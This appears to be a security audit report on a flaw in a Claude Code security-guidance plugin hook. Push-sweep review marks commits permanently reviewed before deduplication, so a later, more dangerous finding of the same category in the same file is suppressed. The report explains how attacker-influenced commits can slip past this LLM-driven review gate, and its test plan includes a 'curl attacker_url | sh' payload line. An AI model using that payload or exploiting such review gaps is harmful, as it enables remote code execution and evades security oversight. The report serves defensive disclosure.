### Title
Push-sweep marks pushed commits permanently "reviewed" and suppresses re-alerting on same-file/same-category findings, letting new dangerous code go unreported - (File: `plugins/security-guidance/hooks/security_reminder_hook.py`)

### Summary
`handle_push_sweep_posttooluse` unconditionally records the whole unreviewed commit tail into `.git/sg-reviewed-shas` before deduplication is applied, and the `previous_findings` state used for suppression is keyed only by `(filePath, category)`, not by the actual vulnerable code or commit SHA. An attacker who controls ordinary diff content across two pushes can get a low-severity finding of a given category recorded for a file, then introduce a genuinely new and more dangerous change of the same category in the same file on a later push; the second finding is silently dropped and the commit range is never reviewable again.

### Finding Description
In `handle_push_sweep_posttooluse`, the reviewed-commit tail is appended to the repo-local `.git/sg-reviewed-shas` log immediately after the LLM review runs, before any deduplication against `previous_findings`: [1](#0-0) 

This means `_compute_push_sweep_base` will treat that entire commit range as already reviewed on any future push or commit-review pass, regardless of whether the findings from this pass were actually surfaced to the user: [2](#0-1) 

Separately, the code that records findings into the shared `previous_findings` state (used by `_dedup_against_state` to suppress "already told the user" findings) keys entries by `(filePath, category)` only — not by `vulnerableCode`, a content hash, or the commit SHA: [3](#0-2) 

This is inconsistent with the documented dedup contract, which states dedup should be keyed on `(filePath, vulnerableCode)`: [4](#0-3) 

Exploit flow:
1. Attacker-controlled repository content (via normal edits/commits, e.g. a contributor branch or agent-driven edits) introduces a first vulnerability of category `C` in file `F` (e.g. a minor injection issue) and pushes it. Push-sweep reviews it, reports it, and records `(F, C)` into `previous_findings`, and marks the covering SHAs reviewed in `.git/sg-reviewed-shas`.
2. A later push introduces a substantively different and more dangerous change in the same file `F` that the LLM classifies under the same `category` `C` (categories are coarse labels like "Command Injection", "Path Traversal", etc., easily reused across unrelated dangerous snippets).
3. `_dedup_against_state`/the `_record` closure treat `(F, C)` as already-seen, so the new, more dangerous finding is dropped from `new_vulns`. If `new_vulns` ends up empty, the handler exits 0 with no `stderr` output and no `sys.exit(2)` rewake: [5](#0-4) 
4. Regardless of suppression, the underlying commit SHAs were already appended to `.git/sg-reviewed-shas` at step before dedup ran, so this range can never be re-surfaced by a subsequent push-sweep, and the per-commit review hook is also short-circuited by the same reviewed-SHA set (`_load_reviewed_shas`/`_already` check in `handle_commit_review_posttooluse`).

No existing guard closes this gap: the rate limiter (`atomic_check_rate_limit`), the range/HEAD verification, and the `_claim_bash_hook_once` sentinel all address different concerns (throughput, correct diff range, double-spawn) and do not validate that a suppressed finding was actually shown to the user before marking the commits permanently reviewed.

### Impact Explanation
This breaks the stated invariant that "dangerous edits and commands must stay reviewable and blockable even across retries, amends, and pushes." A second, more severe vulnerability sharing a category label with a previously-reported (and already dismissed) finding in the same file is silently dropped from the asyncRewake mechanism, and the commit range is permanently marked reviewed — meaning the dangerous change is never re-surfaced by push-sweep, commit-review, or (since it also touches `previous_findings`, which the Stop hook path also reads for dedup) the Stop-hook backstop. This can let a genuinely exploitable/dangerous local command or code path slip past the plugin's approval/review gate, i.e., unauthorized local command execution content is committed and pushed without the review-driven warning/block the security-guidance plugin is meant to guarantee.

### Likelihood Explanation
Feasibility is high for anyone who can cause two ordinary pushes touching the same file with findings that the LLM classifies under the same broad category (a common occurrence given the small, fixed category vocabulary such as "Command Injection", "Path Traversal", "SSRF", etc.). No privileged access, key leakage, or social engineering is required — only normal commit/push activity with attacker-influenced diff content (e.g., PR content merged and pushed by the legitimate user's Claude Code session, or agent-driven edits following repository-embedded instructions). The bug is deterministic given the code paths shown (unconditional `_append_reviewed_shas` before dedup, and category-only dedup key), making it reliably reproducible.

### Recommendation
1. Do not call `_append_reviewed_shas` for the tail until after the findings have actually been reported (i.e., only mark SHAs reviewed if `new_vulns` was non-empty and reported, or if `vulns` was genuinely empty from analysis — not merely deduped away).
2. Key `previous_findings`/`_dedup_against_state` suppression on a stronger identity than `(filePath, category)` — e.g., `(filePath, category, hash(vulnerableCode))` or include the commit SHA — so that a new, distinct dangerous snippet in the same file/category is not silently suppressed just because an earlier, unrelated finding of the same category was already shown.
3. Align the implementation with the documented contract (`(filePath, vulnerableCode)` dedup) referenced in `handle_commit_review_posttooluse`'s docstring.

### Proof of Concept
Integration test plan for `security_reminder_hook.py`:
1. Initialize a git repo; set `PUSH_SWEEP_ENABLED=True`, `ENABLE_CODE_SECURITY_REVIEW=True`, and stub `analyze_code_security`/`_agentic_review_with_race` to return a controllable `vulns` list.
2. Commit 1: introduce `os.system(user_input)` in `app.py`, classified by the stub as `{"filePath": "app.py", "category": "Command Injection", "vulnerableCode": "os.system(user_input)"}`. Push. Assert: `sys.exit(2)` fires, stderr contains the finding, `previous_findings` now has `("app.py", "Command Injection")`, and `.git/sg-reviewed-shas` contains the commit SHA.
3. Commit 2: introduce a distinct, more dangerous line, e.g. `subprocess.run(f"curl {attacker_url} | sh", shell=True)` in `app.py`, stubbed to return `{"filePath": "app.py", "category": "Command Injection", "vulnerableCode": "subprocess.run(f\"curl {attacker_url} | sh\", shell=True)"}`. Push.
4. Assert (expected current buggy behavior): `new_vulns` is empty after `_dedup_against_state`, handler exits 0 with no stderr write, and `.git/sg-reviewed-shas` now also contains commit 2's SHA — i.e., the dangerous second finding was never surfaced and can never be re-reviewed by a later push-sweep or commit-review pass (`_load_reviewed_shas` will contain it).
5. After applying the recommended fix (content/SHA-based dedup key and conditional `_append_reviewed_shas`), re-run and assert `sys.exit(2)` fires for commit 2 with the new finding reported.

### Citations

**File:** plugins/security-guidance/hooks/security_reminder_hook.py (L717-737)
```python
def _compute_push_sweep_base(prev_upstream, push_range, reviewed):
    """Advance the diff base past the contiguous reviewed prefix.

    Spec: review `git diff B..HEAD` where `B` is the newest commit such that
    `prev_upstream..B` is entirely in `reviewed`. Returns (B, unreviewed_tail).
    `B == None` means the whole range is reviewed (caller should skip).
    `push_range` must be oldest→newest.

    Examples (✓=reviewed, ✗=not):
      [✓1, ✗2, ✓3]  → B=1, tail=[2,3]   (cannot trim suffix; Read is at HEAD)
      [✓1, ✓2, ✓3]  → B=None            (all reviewed → skip)
      [✗1, ✓2, ✗3]  → B=prev_upstream, tail=[1,2,3]
      []            → B=None
    """
    i = 0
    while i < len(push_range) and push_range[i] in reviewed:
        i += 1
    if i == len(push_range):
        return None, []
    base = push_range[i - 1] if i > 0 else prev_upstream
    return base, push_range[i:]
```

**File:** plugins/security-guidance/hooks/security_reminder_hook.py (L901-910)
```python
def handle_commit_review_posttooluse(input_data):
    """PostToolUse handler for Bash — reviews git commits for security issues.

    Runs as asyncRewake: detects `git commit` in the Bash command, parses
    the resulting SHA(s) from the Bash stdout `[branch sha] msg` line, runs
    `git show -p <sha>` per SHA, sends the combined diff through
    analyze_code_security, and exits with code 2 (stderr findings) to wake
    the model. Deduplicates against the shared previous_findings state so
    the Stop hook won't re-flag the same (filePath, vulnerableCode) pair.
    """
```

**File:** plugins/security-guidance/hooks/security_reminder_hook.py (L1622-1627)
```python
    # The tail is now covered by this net-diff review.
    _append_reviewed_shas(repo_root, tail, vulns_found=len(vulns or []))

    new_vulns, n_deduped = _dedup_against_state(
        session_id, vulns or [], prompted=_finding_keys(previous_findings)
    )
```

**File:** plugins/security-guidance/hooks/security_reminder_hook.py (L1641-1643)
```python
    if not new_vulns:
        debug_log("Push sweep: no new findings")
        sys.exit(0)
```

**File:** plugins/security-guidance/hooks/security_reminder_hook.py (L1671-1681)
```python
    def _record(state):
        existing = [f for f in state.get("previous_findings", [])
                    if isinstance(f, dict)]
        seen = {(f.get("filePath", ""), f.get("category", "")) for f in existing}
        for f in snapshots:
            k = (f["filePath"], f["category"])
            if k not in seen:
                seen.add(k); existing.append(f)
        state["previous_findings"] = existing
        state["previous_findings_ts"] = _time.time()
    with_locked_state(session_id, _record)
```
